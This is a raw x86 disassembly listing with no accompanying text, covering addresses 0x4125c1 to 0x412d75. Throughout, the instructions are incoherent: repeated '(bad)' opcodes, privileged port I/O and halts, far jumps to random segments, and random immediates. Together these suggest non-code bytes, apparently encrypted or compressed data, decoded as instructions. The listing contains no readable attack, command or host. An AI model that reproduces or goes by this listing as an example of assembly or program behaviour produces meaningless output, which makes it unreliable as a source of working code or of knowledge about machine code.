  4125c1:	xlat   BYTE PTR ds:[ebx]
  4125c2:	out    0x46,eax
  4125c4:	inc    ecx
  4125c5:	add    BYTE PTR [edx],al
  4125c7:	out    dx,al
  4125c8:	rcr    DWORD PTR [eax+0x2e],cl
  4125cb:	cmp    edx,DWORD PTR [eax+0x1f2d8e54]
  4125d1:	and    bh,ah
  4125d3:	loope  0x4125e1
  4125d5:	dec    ebx
  4125d6:	lods   eax,DWORD PTR ds:[esi]
  4125d7:	jmp    0x4125c7
  4125d9:	je     0x4125cd
  4125db:	(bad)  [esi]
  4125dd:	push   esi
  4125de:	jns    0x412638
  4125e0:	jne    0x4125c2
  4125e2:	nop
  4125e3:	dec    edx
  4125e4:	or     dl,ah
  4125e6:	icebp  
  4125e7:	mov    ds:0x2a9dca9e,eax
  4125ec:	into   
  4125ed:	sbb    esi,DWORD PTR [ebx-0x61]
  4125f0:	(bad)  
  4125f1:	dec    esi
  4125f2:	mov    WORD PTR [ebp+ebp*8-0x3a81e357],ds
  4125f9:	sbb    BYTE PTR [ecx-0x4a],al
  4125fc:	dec    esp
  4125fd:	or     bl,dh
  4125ff:	es lock dec edx
  412602:	loope  0x41267d
  412604:	mov    edi,0x9b9e9cb0
  412609:	sbb    al,0xa4
  41260b:	dec    edx
  41260c:	sub    bl,ch
  41260e:	sub    bh,BYTE PTR [eax+edi*2]
  412611:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412612:	fisttp DWORD PTR [ebp-0x60]
  412615:	ret    0x88d5
  412618:	(bad)  
  41261a:	xchg   edi,eax
  41261b:	sbb    al,ch
  41261d:	or     esp,edx
  41261f:	aaa    
  412620:	and    ecx,edi
  412622:	jae    0x412604
  412624:	push   0xffffffd3
  412626:	fcom   DWORD PTR [eax]
  412628:	(bad)  
  412629:	mov    eax,0xc2586fb5
  41262e:	out    0xfd,al
  412630:	or     BYTE PTR [ebp+0x46a92ef9],ah
  412636:	repz adc dh,bl
  412639:	call   0xecec:0x6b902be8
  412640:	or     al,dl
  412642:	mov    al,ds:0x473baded
  412647:	rcr    ebx,0x2e
  41264a:	mov    dh,0xd4
  41264c:	jmp    ebx
  41264e:	ret    
  41264f:	adc    al,0xfd
  412651:	jp     0x4126aa
  412653:	pop    ecx
  412654:	xchg   ebx,eax
  412655:	adc    al,0x34
  412657:	pop    es
  412658:	cmp    esi,esi
  41265a:	jns    0x4125e7
  41265c:	push   ebp
  41265d:	sahf   
  41265e:	loop   0x4126c2
  412660:	push   ds
  412661:	mov    DWORD PTR [edx+edx*8-0x4e],0x59d2f0d2
  412669:	lahf   
  41266a:	ins    DWORD PTR es:[edi],dx
  41266b:	retf   
  41266c:	mov    edx,0x2ac9e318
  412671:	lds    edx,FWORD PTR [ebx+edi*8]
  412674:	data16 jno 0x412613
  412677:	or     al,0xfc
  412679:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41267a:	ja     0x412642
  41267c:	call   FWORD PTR [ecx+0x53]
  41267f:	cmp    BYTE PTR [ecx],bl
  412681:	fs loop 0x41261d
  412684:	sub    eax,0x9ba581ac
  412689:	mov    ds:0x71413599,eax
  41268e:	into   
  41268f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412690:	leave  
  412691:	imul   ecx,DWORD PTR [edx+0x1baa8428],0xffffffb3
  412698:	repz mov ebx,0xb06669fd
  41269e:	adc    DWORD PTR [esi+0xb],ebx
  4126a1:	pusha  
  4126a2:	je     0x412654
  4126a4:	pop    ss
  4126a5:	rcr    BYTE PTR [ebx-0x34d5b8a0],0x9e
  4126ac:	push   ecx
  4126ad:	jmp    0x41266d
  4126af:	cmp    esi,DWORD PTR [eax-0x20]
  4126b2:	cmp    DWORD PTR [edi],ecx
  4126b4:	cmp    al,0x3e
  4126b6:	fldenv [edx+eiz*8-0x406c3d5e]
  4126bd:	dec    esp
  4126be:	pop    es
  4126bf:	popf   
  4126c0:	stc    
  4126c1:	(bad)  
  4126c2:	daa    
  4126c3:	sub    BYTE PTR [edi-0x3e],bl
  4126c6:	xchg   esi,eax
  4126c7:	sti    
  4126c8:	dec    ebx
  4126c9:	out    dx,eax
  4126ca:	lods   al,BYTE PTR ds:[esi]
  4126cb:	fbld   TBYTE PTR [eax]
  4126cd:	ss sbb eax,0xe3b6bfd
  4126d3:	(bad)  
  4126d4:	fsubr  DWORD PTR [esi+eax*8-0x1ebdc086]
  4126db:	dec    edi
  4126dc:	addr16 int3 
  4126de:	adc    eax,0x666a7bea
  4126e3:	out    dx,eax
  4126e4:	add    esp,DWORD PTR [edx+0x58e499bb]
  4126ea:	mov    ebp,0x79600622
  4126ef:	add    BYTE PTR [eax],ah
  4126f1:	mov    esi,0x6e4b571d
  4126f6:	inc    edi
  4126f7:	iret   
  4126f8:	xor    al,0xca
  4126fa:	into   
  4126fb:	xchg   ebp,eax
  4126fc:	jne    0x412726
  4126fe:	lods   eax,DWORD PTR ds:[esi]
  4126ff:	push   0x47d6223b
  412704:	jmp    0xe503:0x7795318a
  41270b:	mov    WORD PTR [eax],ss
  41270d:	not    DWORD PTR [ecx+0x1016aa57]
  412713:	jmp    0x4126cf
  412715:	push   eax
  412716:	aaa    
  412717:	jg     0x412778
  412719:	jno    0x41278a
  41271b:	lods   al,BYTE PTR ds:[si]
  41271d:	dec    ebx
  41271e:	mov    WORD PTR [esi],ds
  412720:	jmp    0x67e66d1e
  412725:	fild   DWORD PTR [ebp+0x18]
  412728:	pop    esp
  412729:	or     al,0x51
  41272b:	mov    DWORD PTR [esi],ecx
  41272d:	cmp    al,0x65
  41272f:	jge    0x4126b2
  412731:	jp     0x4126ff
  412733:	sub    eax,DWORD PTR [esp+esi*4+0x4e]
  412737:	out    0xd6,eax
  412739:	add    al,0x14
  41273b:	fstp   TBYTE PTR [esi+0x6cdb8d4a]
  412741:	out    dx,al
  412742:	jp     0x41274c
  412744:	add    ebx,DWORD PTR [ecx+edx*4]
  412747:	fs lock sub ebx,ebp
  41274b:	add    ah,bh
  41274d:	(bad)  
  41274f:	(bad)  
  412750:	int3   
  412751:	pop    ebx
  412752:	loop   0x41277d
  412754:	xor    al,0xd8
  412756:	mov    ah,0x9
  412758:	js     0x4127ac
  41275a:	pop    esp
  41275b:	std    
  41275c:	pop    ebx
  41275d:	loop   0x412701
  41275f:	sub    BYTE PTR [esi],0xb6
  412762:	shr    dl,0x28
  412765:	hlt    
  412766:	push   edi
  412767:	add    al,BYTE PTR [ebp+esi*1-0x9]
  41276b:	cdq    
  41276c:	jno    0x412719
  41276e:	adc    BYTE PTR [ecx-0x2e],cl
  412771:	iret   
  412772:	ficomp DWORD PTR [edx+0xc]
  412775:	sbb    DWORD PTR [ebp+0x1a91193c],0x2b
  41277c:	jecxz  0x412747
  41277e:	push   esp
  41277f:	or     al,0xaf
  412781:	dec    ecx
  412782:	push   ebx
  412783:	push   ds
  412784:	clc    
  412785:	out    0xd0,eax
  412787:	sbb    eax,edx
  412789:	cdq    
  41278a:	(bad)  
  41278b:	mov    cl,0x57
  41278d:	jns    0x412716
  41278f:	jge    0x4127da
  412791:	lods   eax,DWORD PTR ds:[esi]
  412792:	sbb    eax,0x987ca5e
  412797:	xchg   ebp,eax
  412798:	ja     0x412729
  41279a:	mov    dl,0xb9
  41279c:	jg     0x41280c
  41279e:	outs   dx,BYTE PTR ds:[esi]
  41279f:	test   BYTE PTR [edi+ecx*4],ch
  4127a2:	sti    
  4127a3:	popa   
  4127a4:	cmp    bl,BYTE PTR [esi+0x4e]
  4127a7:	test   DWORD PTR [edx+edx*2],edi
  4127aa:	push   ebx
  4127ab:	xor    DWORD PTR fs:[esi*2+0x6a75630e],ecx
  4127b3:	popf   
  4127b4:	mov    bh,0xf6
  4127b6:	test   eax,0x225886b5
  4127bb:	stc    
  4127bc:	pop    eax
  4127bd:	mov    ds:0xd202173b,eax
  4127c2:	lods   al,BYTE PTR ds:[esi]
  4127c3:	jne    0x412836
  4127c5:	fcmovne st,st(4)
  4127c7:	push   0x7c
  4127c9:	ret    0x8f6c
  4127cc:	dec    ebp
  4127cd:	xchg   esp,eax
  4127ce:	(bad)  
  4127cf:	enter  0x226a,0x6d
  4127d3:	push   ss
  4127d4:	sub    DWORD PTR [eax-0x5a],ecx
  4127d7:	push   esp
  4127d8:	mov    BYTE PTR [esi-0x66fa01c4],ah
  4127de:	push   edx
  4127df:	xchg   ebx,eax
  4127e0:	loop   0x4127b5
  4127e2:	call   0xfbf5:0xbc333452
  4127e9:	mov    bh,0x92
  4127eb:	add    BYTE PTR [ebx+0x23f7fe44],cl
  4127f1:	and    ah,BYTE PTR [eax-0x2b1e1d55]
  4127f7:	test   al,0x1c
  4127f9:	pop    ds
  4127fa:	imul   ebp,DWORD PTR [eax+edi*1-0x71],0x63
  4127ff:	sbb    al,0xd4
  412801:	push   edi
  412802:	dec    ecx
  412803:	or     al,0xa7
  412805:	and    esi,DWORD PTR [esi-0x52]
  412808:	push   es
  412809:	idiv   BYTE PTR [ebp-0xc]
  41280c:	mov    al,ds:0x452edd70
  412811:	in     al,dx
  412812:	or     bh,BYTE PTR [ecx-0x66]
  412815:	test   eax,0x1d959494
  41281a:	sub    ecx,DWORD PTR [eax-0x4f]
  41281d:	inc    ecx
  41281e:	xchg   DWORD PTR [ebx],eax
  412820:	add    DWORD PTR [edx],edi
  412822:	ror    BYTE PTR [eax+0x16d582],cl
  412828:	scas   al,BYTE PTR es:[edi]
  412829:	ss pop ecx
  41282b:	enter  0xda7e,0xac
  41282f:	sub    BYTE PTR [edi-0x38],dh
  412832:	jmp    0x2666:0x95517f4b
  412839:	out    0xaa,eax
  41283b:	shl    BYTE PTR [edx-0x46ef0111],1
  412841:	cdq    
  412842:	inc    ebp
  412843:	daa    
  412844:	pop    edx
  412845:	in     eax,0xe4
  412847:	sbb    eax,0x73910ceb
  41284c:	std    
  41284d:	outs   dx,BYTE PTR ds:[esi]
  41284e:	mov    bh,0x7c
  412850:	sbb    BYTE PTR [ecx+0x537eebd0],cl
  412856:	sub    eax,0xf4f0a92e
  41285b:	mov    ah,0xd6
  41285d:	(bad)  
  41285e:	ins    DWORD PTR es:[edi],dx
  41285f:	dec    ebp
  412860:	ds (bad) 
  412862:	aam    0x81
  412864:	lods   al,BYTE PTR ds:[esi]
  412865:	xor    ch,bl
  412867:	js     0x412858
  412869:	lods   eax,DWORD PTR ds:[esi]
  41286a:	int3   
  41286b:	sub    DWORD PTR [edx],eax
  41286d:	add    ecx,DWORD PTR [ebx+0x39]
  412870:	mov    ebp,ebx
  412872:	mov    edx,0xca76e31c
  412877:	je     0x412804
  412879:	xchg   esi,eax
  41287a:	inc    esp
  41287b:	or     al,0x53
  41287d:	jmp    0x962b:0x689ba0e7
  412884:	mov    eax,ds:0xf688353
  412889:	leave  
  41288a:	retf   
  41288b:	(bad)  
  41288d:	(bad)  
  41288e:	jmp    0xa4ff5070
  412893:	sti    
  412894:	(bad)  [edi-0x5ebd20ac]
  41289a:	out    0x9e,al
  41289c:	es popa 
  41289e:	sbb    DWORD PTR ds:0x94a5bbb6,ebp
  4128a4:	ror    BYTE PTR [edx+ebp*4],0x70
  4128a8:	cs xor al,0x5b
  4128ab:	loope  0x412831
  4128ad:	inc    ecx
  4128ae:	ret    
  4128af:	pop    es
  4128b0:	xor    cl,BYTE PTR [esi]
  4128b2:	cmp    al,0x4c
  4128b4:	xor    esp,DWORD PTR [ecx]
  4128b6:	inc    ecx
  4128b7:	mov    bh,0xfa
  4128b9:	mov    DWORD PTR [ebp+0x3f],esi
  4128bc:	mov    ah,bl
  4128be:	adc    esi,DWORD PTR [eax+edi*8-0x32a778c4]
  4128c5:	rol    DWORD PTR [ecx],cl
  4128c7:	hlt    
  4128c8:	lea    edi,[ecx]
  4128ca:	int3   
  4128cb:	gs fmul st(4),st
  4128ce:	sbb    edi,DWORD PTR [edx+0x230a636e]
  4128d4:	mov    al,ds:0x52df4fac
  4128d9:	cmp    al,0xb6
  4128db:	mov    BYTE PTR [ebx],cl
  4128dd:	hlt    
  4128de:	mov    ch,0xd6
  4128e0:	pop    ecx
  4128e1:	ja     0x41290f
  4128e3:	jp     0x412869
  4128e5:	or     ebx,esp
  4128e7:	fwait
  4128e8:	inc    ebp
  4128e9:	leave  
  4128ea:	(bad)  
  4128eb:	cmc    
  4128ec:	repz mov ah,0x23
  4128ef:	and    BYTE PTR [ecx-0x24e131ba],bl
  4128f5:	xor    al,0x12
  4128f7:	iret   
  4128f8:	jecxz  0x4128c5
  4128fa:	pop    edi
  4128fb:	(bad)  
  4128fc:	push   edi
  4128fd:	fist   WORD PTR [ebx-0xa34c408]
  412903:	jmp    0x7f80100d
  412908:	ja     0x412984
  41290a:	(bad)  
  41290c:	jo     0x412972
  41290e:	es stos DWORD PTR es:[edi],eax
  412910:	and    ah,bl
  412912:	sub    BYTE PTR [ebx+ecx*4+0x71c2aa13],bh
  412919:	jne    0x41295f
  41291b:	ds pop eax
  41291d:	xor    ah,BYTE PTR [edx+0x1a19dd85]
  412923:	and    BYTE PTR [esp-0x49],cl
  412927:	cmp    bl,BYTE PTR [eax+edi*4]
  41292a:	mov    bl,0x88
  41292c:	cld    
  41292d:	aad    0x1f
  41292f:	outs   dx,DWORD PTR ds:[esi]
  412930:	aam    0x39
  412932:	daa    
  412933:	outs   dx,DWORD PTR ds:[esi]
  412934:	adc    bl,al
  412936:	pop    es
  412937:	or     BYTE PTR [edi+0x75],dl
  41293a:	fmul   QWORD PTR [eax-0x5c]
  41293d:	arpl   WORD PTR [ebx],dx
  41293f:	sti    
  412940:	xchg   edx,eax
  412941:	retf   0x141e
  412944:	xchg   esi,eax
  412945:	mov    DWORD PTR [esi],esp
  412947:	sbb    ebx,DWORD PTR [edx-0x4e]
  41294a:	mov    ebx,0x5e0bf977
  41294f:	jmp    0x778c:0xfbf09edf
  412956:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412957:	(bad)  
  412958:	mov    dh,0x82
  41295a:	xchg   edx,eax
  41295b:	push   0x351f483e
  412960:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412961:	aaa    
  412962:	cmp    al,0x2c
  412964:	inc    ecx
  412965:	push   ss
  412966:	mov    cl,0x99
  412968:	inc    esp
  412969:	push   0x35
  41296b:	xor    dl,BYTE PTR [eax]
  41296d:	outs   dx,BYTE PTR ds:[esi]
  41296e:	push   0xded18419
  412973:	sbb    DWORD PTR [eax],ecx
  412975:	int    0xd4
  412977:	sbb    edx,0x34
  41297a:	or     esi,DWORD PTR [ebx]
  41297c:	scas   al,BYTE PTR es:[edi]
  41297d:	mov    bh,0x8e
  41297f:	imul   esi,DWORD PTR [ecx+0x52],0xffffffd5
  412983:	repz and DWORD PTR [edi],0xffffffda
  412987:	popa   
  412988:	loopne 0x4129a3
  41298a:	or     ch,BYTE PTR [ebp*1+0x71b5fce7]
  412991:	cs loopne 0x412954
  412994:	fidiv  DWORD PTR [ebp+0x50]
  412997:	(bad)  
  412998:	pop    esi
  412999:	mov    BYTE PTR [edi],0x87
  41299c:	or     al,0x44
  41299e:	xchg   esi,eax
  41299f:	std    
  4129a0:	inc    esp
  4129a1:	add    BYTE PTR [ebx-0x28],bh
  4129a4:	fnstcw WORD PTR [ecx+ecx*4]
  4129a7:	fisttp QWORD PTR [ecx]
  4129a9:	pusha  
  4129aa:	(bad)  
  4129ab:	sub    BYTE PTR [esi+eiz*8],dh
  4129ae:	sbb    esp,DWORD PTR [ebx+eax*1]
  4129b1:	hlt    
  4129b2:	mov    bl,0x9f
  4129b4:	scas   al,BYTE PTR es:[edi]
  4129b5:	and    eax,0x350b9000
  4129ba:	fs jo  0x412a21
  4129bd:	sub    edi,ebp
  4129bf:	stos   BYTE PTR es:[edi],al
  4129c0:	or     dl,BYTE PTR [edx]
  4129c2:	xchg   DWORD PTR es:[esi+0xc],ecx
  4129c6:	cmova  esi,DWORD PTR [edx-0x42]
  4129ca:	jb     0x412954
  4129cc:	fs int 0x33
  4129cf:	and    BYTE PTR [edx+0x21],0x27
  4129d3:	sub    ch,ch
  4129d5:	test   eax,0xeffa6837
  4129da:	adc    eax,DWORD PTR [edi+0x76fe3a9]
  4129e0:	pushf  
  4129e1:	addr16 push ecx
  4129e3:	jne    0x412a07
  4129e5:	jmp    0x411749ad
  4129ea:	fidiv  WORD PTR [eax-0x3b]
  4129ed:	loopne 0x4129a8
  4129ef:	inc    edi
  4129f0:	das    
  4129f1:	cli    
  4129f2:	jmp    0x42ec1264
  4129f7:	dec    ebp
  4129f8:	pop    edx
  4129f9:	sbb    eax,0xfbac31b
  4129fe:	or     BYTE PTR [edx+0x24dac953],dh
  412a04:	inc    ebx
  412a05:	out    0x4d,al
  412a07:	test   DWORD PTR ds:0x93f090ef,edi
  412a0d:	es and eax,0xdfb96516
  412a13:	add    eax,0x904e82a1
  412a18:	cwde   
  412a19:	int3   
  412a1a:	fidivr DWORD PTR [ebp-0x26]
  412a1d:	and    BYTE PTR [ebx-0x747fbd5d],al
  412a23:	cld    
  412a24:	mov    dl,0x47
  412a26:	cmp    BYTE PTR [edx],0xe4
  412a29:	cwde   
  412a2a:	xchg   BYTE PTR [edi],cl
  412a2c:	dec    ebx
  412a2d:	add    al,ah
  412a2f:	fisubr DWORD PTR [ebx]
  412a31:	xor    eax,0x31ac985a
  412a36:	mov    dl,0xdb
  412a38:	rol    BYTE PTR [esi-0x472fb146],cl
  412a3e:	fnsave [eax+0x266f9442]
  412a44:	adc    eax,0x3565bd4
  412a49:	xchg   DWORD PTR [ebx-0x2b],esi
  412a4c:	xorps  xmm6,XMMWORD PTR [esi+0x6b7dbe98]
  412a53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a54:	rol    DWORD PTR [edi-0x48],0xb2
  412a58:	or     ecx,DWORD PTR [ebx-0x22fc7e9d]
  412a5e:	sar    DWORD PTR [ebx+ebp*4],1
  412a61:	arpl   WORD PTR [ecx+0x6b0f36a3],cx
  412a67:	jp     0x412a20
  412a69:	imul   ebp,DWORD PTR [ebx-0x7aec044e],0xa94ebfba
  412a73:	jmp    0x412a2b
  412a75:	pop    esp
  412a76:	pop    ecx
  412a77:	call   0x38c0:0xb6c3a252
  412a7e:	pop    edi
  412a7f:	scas   eax,DWORD PTR es:[edi]
  412a80:	xchg   cx,ax
  412a82:	sub    ecx,DWORD PTR [ebp+0x2ba6f6b3]
  412a88:	inc    eax
  412a89:	(bad)  
  412a8a:	mov    ch,BYTE PTR [ebx-0x1d49446a]
  412a90:	mov    dl,0xef
  412a92:	pop    esi
  412a93:	nop
  412a94:	add    ecx,esi
  412a96:	xor    eax,0xbf30eb7e
  412a9b:	lahf   
  412a9c:	repz jb 0x412aae
  412a9f:	loop   0x412a69
  412aa1:	push   eax
  412aa2:	out    dx,eax
  412aa3:	and    al,0xc
  412aa5:	or     eax,0x29b9ed2b
  412aaa:	cli    
  412aab:	enter  0x85df,0xc1
  412aaf:	push   ebp
  412ab0:	inc    ebx
  412ab1:	sub    esp,ebx
  412ab3:	mov    bl,0xf9
  412ab5:	cmp    BYTE PTR [esp+ebp*4+0x18],dh
  412ab9:	sbb    ebx,DWORD PTR [ebp+0x4f55eeb8]
  412abf:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  412ac1:	mov    edx,0xa51ae248
  412ac6:	adc    ch,bh
  412ac8:	enter  0xa827,0xe7
  412acc:	retf   
  412acd:	hlt    
  412ace:	mov    al,0xd9
  412ad0:	shl    cl,cl
  412ad2:	jmp    0xd0ad9e89
  412ad7:	stos   DWORD PTR es:[edi],eax
  412ad8:	pop    es
  412ad9:	mov    eax,0xb640c014
  412ade:	in     al,0x68
  412ae0:	lds    ebp,FWORD PTR [ebx-0x364789af]
  412ae6:	cs push 0x54
  412ae9:	rcl    DWORD PTR ds:0xd37c21a2,1
  412aef:	mov    esp,DWORD PTR [ecx-0x7a]
  412af2:	inc    esp
  412af3:	mov    esp,0xe5ff47e8
  412af8:	adc    DWORD PTR [ebp-0x6b],edx
  412afb:	aaa    
  412afc:	aam    0x0
  412afe:	(bad)  
  412aff:	push   eax
  412b00:	pop    ss
  412b01:	push   ebp
  412b02:	lock arpl di,di
  412b05:	aas    
  412b06:	(bad)  
  412b07:	xchg   edx,eax
  412b08:	push   esi
  412b09:	shl    BYTE PTR [edx],1
  412b0b:	mov    esp,0x6ac82850
  412b10:	xchg   ecx,eax
  412b11:	mov    dh,0x28
  412b13:	xlat   BYTE PTR ds:[ebx]
  412b14:	shl    DWORD PTR [esi+esi*2],cl
  412b17:	mov    ecx,0xfd21bc9b
  412b1c:	pop    esp
  412b1d:	rcl    DWORD PTR [ecx+eiz*1],1
  412b20:	(bad)
  412b23:	mov    edx,0xb680d087
  412b28:	(bad)  
  412b29:	mov    esp,0x8ddc6cf5
  412b2e:	loop   0x412ab8
  412b30:	mov    eax,0x8ee63a6e
  412b35:	out    0x1c,eax
  412b37:	loopne 0x412b44
  412b39:	dec    esp
  412b3a:	enter  0x4973,0x3d
  412b3e:	xchg   edi,eax
  412b3f:	or     ebp,ebx
  412b41:	or     dl,bh
  412b43:	add    BYTE PTR [ebx-0x342eb2fb],0x60
  412b4a:	int3   
  412b4b:	imul   ebp,DWORD PTR [eax+esi*1+0x57],0x87068ad4
  412b53:	ror    DWORD PTR [edx],0xaa
  412b56:	dec    ecx
  412b57:	(bad)  
  412b58:	push   ebp
  412b59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b5a:	cwde   
  412b5b:	inc    ebp
  412b5c:	clc    
  412b5d:	rcr    DWORD PTR [ecx],1
  412b5f:	clc    
  412b60:	pop    ecx
  412b61:	sbb    bh,BYTE PTR [ebp+0x76]
  412b64:	mov    ebx,0x7a24d501
  412b69:	(bad)  
  412b6a:	cmp    BYTE PTR [edi],bl
  412b6c:	sbb    esp,ecx
  412b6e:	mov    ch,0xc0
  412b70:	pushf  
  412b71:	rcr    ah,1
  412b73:	fcmovnbe st,st(7)
  412b75:	sahf   
  412b76:	pop    edi
  412b77:	jb     0x412bb0
  412b79:	test   eax,0xd0ce1940
  412b7e:	sub    eax,0x24978ef4
  412b83:	jne    0x412bd9
  412b85:	mov    ds:0x1761de30,al
  412b8a:	mov    esi,0x41c9bae2
  412b8f:	xchg   esi,eax
  412b90:	jge    0x412b21
  412b92:	or     ebx,DWORD PTR [ecx-0x1bed832a]
  412b98:	mov    bh,0xbc
  412b9a:	test   eax,0x401e486e
  412b9f:	dec    eax
  412ba0:	addr16 ret 0x9235
  412ba4:	mov    dl,0x57
  412ba6:	out    0x74,al
  412ba8:	push   esp
  412ba9:	mov    dh,0x66
  412bab:	shr    DWORD PTR [ebx-0x72128d57],0xb8
  412bb2:	pop    ecx
  412bb3:	cmp    eax,0xf71f4983
  412bb8:	mov    al,0x35
  412bba:	mov    eax,ds:0x53faeb74
  412bbf:	sub    BYTE PTR [edi+ebp*1],0x1
  412bc3:	(bad)  
  412bc4:	mov    ds:0x582b9186,eax
  412bc9:	mov    al,ds:0xda22926d
  412bce:	leave  
  412bcf:	in     eax,dx
  412bd0:	or     eax,0x9feb213a
  412bd5:	xchg   DWORD PTR [ebx+0x5],ecx
  412bd8:	aaa    
  412bd9:	push   ebx
  412bda:	jbe    0x412b66
  412bdc:	xchg   edi,eax
  412bdd:	sub    BYTE PTR [ebx-0x5a],bl
  412be0:	lds    esi,FWORD PTR [ebx]
  412be2:	retf   
  412be3:	or     eax,0x9ee072e8
  412be8:	loop   0x412c36
  412bea:	and    dh,BYTE PTR [edx+ebp*2]
  412bed:	test   eax,0x2bcb5d53
  412bf2:	sbb    al,0x42
  412bf4:	pop    es
  412bf5:	mov    bh,0x5b
  412bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412bf8:	popf   
  412bf9:	mov    ecx,0x25142274
  412bfe:	add    ecx,DWORD PTR [edi]
  412c00:	int    0xff
  412c02:	mov    eax,ds:0xabc109e3
  412c07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c08:	bound  ebx,QWORD PTR [esi]
  412c0a:	jp     0x412c1f
  412c0c:	add    eax,0x88808b54
  412c11:	jge    0x412bad
  412c13:	test   eax,0xe1bd643d
  412c18:	push   eax
  412c19:	xor    cl,bl
  412c1b:	push   ebx
  412c1c:	xor    al,0x44
  412c1e:	(bad)  
  412c1f:	jmp    0x412c6e
  412c21:	sub    eax,0x3ac6b764
  412c26:	jmp    0x6e54:0x5c11c76c
  412c2d:	hlt    
  412c2e:	enter  0xbb83,0x1f
  412c32:	dec    esi
  412c33:	test   edi,0x9d813238
  412c39:	pushf  
  412c3a:	sbb    esp,esi
  412c3c:	aam    0x1e
  412c3e:	xor    al,0xe9
  412c40:	sbb    edx,DWORD PTR [edi]
  412c42:	inc    edx
  412c43:	ins    BYTE PTR es:[edi],dx
  412c44:	add    DWORD PTR [ecx],esi
  412c46:	aad    0xd2
  412c48:	aaa    
  412c49:	push   ds
  412c4a:	icebp  
  412c4b:	dec    ebx
  412c4c:	add    eax,0x59404242
  412c51:	or     ch,bl
  412c53:	mov    bh,BYTE PTR [edi-0x24]
  412c56:	push   ebp
  412c57:	jnp    0x412bec
  412c59:	inc    esi
  412c5a:	mov    ebx,0x7ca2584f
  412c5f:	fild   DWORD PTR [ecx-0x1b]
  412c62:	loop   0x412bff
  412c64:	add    al,0xbc
  412c66:	pop    esp
  412c67:	iret   
  412c68:	push   edx
  412c69:	jbe    0x412c95
  412c6b:	stos   BYTE PTR es:[edi],al
  412c6c:	mov    ebx,0x21e40413
  412c71:	outs   dx,BYTE PTR ds:[esi]
  412c72:	dec    esi
  412c73:	xor    BYTE PTR [eax-0x5a],bl
  412c76:	mov    bl,0xa0
  412c78:	nop
  412c79:	sbb    BYTE PTR [ecx],ah
  412c7b:	jle    0x412cd5
  412c7d:	xor    eax,0x82975a13
  412c82:	sbb    DWORD PTR [esi-0x1dc61462],esi
  412c88:	xor    eax,0x32b13dd6
  412c8d:	and    eax,esi
  412c8f:	or     ch,ah
  412c91:	mov    al,0x52
  412c93:	cdq    
  412c94:	xchg   ebp,eax
  412c95:	(bad)  
  412c96:	inc    eax
  412c97:	scas   al,BYTE PTR es:[edi]
  412c98:	sbb    eax,DWORD PTR [ebp+0x48]
  412c9b:	push   edi
  412c9c:	cmp    al,BYTE PTR [eax+0x58]
  412c9f:	retf   
  412ca0:	mov    edx,DWORD PTR [esi+0x3f297f0e]
  412ca6:	data16 cmp cl,BYTE PTR [eax-0x8]
  412caa:	loopne 0x412caf
  412cac:	push   edx
  412cad:	dec    BYTE PTR [edx-0x30]
  412cb0:	scas   eax,DWORD PTR es:[edi]
  412cb1:	ret    0x434a
  412cb4:	and    al,0x5
  412cb6:	call   0x65832f94
  412cbb:	jmp    0x58895579
  412cc0:	aas    
  412cc1:	hlt    
  412cc2:	push   edi
  412cc3:	js     0x412cd9
  412cc5:	add    al,0x24
  412cc7:	nop
  412cc8:	cmp    al,0xef
  412cca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ccb:	pop    edx
  412ccc:	xor    al,0x61
  412cce:	fist   DWORD PTR [ecx-0x51616fa4]
  412cd4:	mov    DWORD PTR [edi],edi
  412cd6:	cdq    
  412cd7:	stc    
  412cd8:	je     0x412cc7
  412cda:	jge    0x412cce
  412cdc:	mov    ch,0x80
  412cde:	pop    edi
  412cdf:	icebp  
  412ce0:	sub    BYTE PTR [eax-0x24],dh
  412ce3:	(bad)  
  412ce4:	int    0xf5
  412ce6:	mul    BYTE PTR [ecx-0x1d]
  412ce9:	mov    ?,edx
  412ceb:	ja     0x412cea
  412ced:	mov    eax,ds:0x26a5ade
  412cf2:	fwait
  412cf3:	leave  
  412cf4:	add    DWORD PTR [ebx-0x33],ebp
  412cf7:	push   ss
  412cf8:	add    eax,0xe7d1d226
  412cfd:	dec    DWORD PTR ds:0x28802ad5
  412d03:	jb     0x412cf0
  412d05:	leave  
  412d06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d07:	xor    al,0x14
  412d09:	or     al,0xa2
  412d0b:	xchg   esi,eax
  412d0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d0d:	sub    BYTE PTR [edx-0x6a918da5],ch
  412d13:	cwde   
  412d14:	xchg   DWORD PTR [esi+ecx*8],ebx
  412d17:	aam    0xff
  412d19:	fmul   DWORD PTR [eax-0x79]
  412d1c:	inc    ecx
  412d1d:	lock or DWORD PTR [ecx+0x66f34167],esi
  412d24:	xor    al,0x74
  412d26:	pushf  
  412d27:	push   ebx
  412d28:	mov    edi,0x8230a362
  412d2d:	call   0xd788666d
  412d32:	mov    cl,0x26
  412d34:	jb     0x412cec
  412d36:	stos   DWORD PTR es:[edi],eax
  412d37:	mov    ecx,0x3447b6a1
  412d3c:	sub    DWORD PTR [ecx+0xf2def3d],edi
  412d42:	and    BYTE PTR [esi],cl
  412d44:	inc    edx
  412d45:	xor    DWORD PTR [eax],0x662244ab
  412d4b:	stos   DWORD PTR es:[edi],eax
  412d4c:	sar    DWORD PTR [eax],cl
  412d4e:	jo     0x412d1d
  412d50:	ins    DWORD PTR es:[edi],dx
  412d51:	(bad)  
  412d52:	mov    ah,0x2b
  412d54:	pop    esp
  412d55:	leave  
  412d56:	xchg   BYTE PTR [edi-0x3d11b179],ch
  412d5c:	nop
  412d5d:	jmp    0x7e6d:0x8ed370dd
  412d64:	iret   
  412d65:	inc    edi
  412d66:	and    eax,0xde7549ab
  412d6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d6c:	dec    esi
  412d6d:	mov    ebp,0xa332f16a
  412d72:	arpl   WORD PTR [edi],cx
  412d74:	iret   
  412d75:	push   ecx
